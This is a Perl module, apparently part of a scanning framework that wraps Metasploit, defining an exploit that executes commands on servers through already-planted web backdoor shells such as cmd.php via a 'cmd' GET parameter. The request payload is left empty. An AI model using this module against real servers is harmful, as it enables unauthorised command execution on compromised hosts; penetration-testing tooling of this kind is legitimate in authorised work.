package SIMPLE::MSF::SimpleBackdoorsExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SimpleBackdoorsExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits unauthenticated simple web backdoor shells by leveraging the

        common backdoor shell's vulnerable parameter  to execute commands. The SecLists project of

        Daniel Miessler and Jason Haddix has a lot of samples for these kind of backdoor shells

        which is categorized under Payloads.

      ",
  METHOD => "",
  MSF_MODULE => "simple_backdoors_exec",
  PATH => "__VAR__=____VAR____&",
  PATHS => ["md.php"],
  REFERENCES => [
    "http://resources.infosecinstitute.com/checking-out-backdoor-shells/",
    "https://github.com/danielmiessler/SecLists/tree/master/Payloads",
  ],
  TITLE => "Simple Backdoor Shell Remote Code Execution",
  VARIABLES => {
    'METHOD' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The path of a backdoor shell", VALUE => "cmd.php" },
    '__VAR__' =>       { DESCRIPTION => "", VALUE => "" },
    'VAR' =>       { DESCRIPTION => "The command variable", VALUE => "cmd" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT42 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #42 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
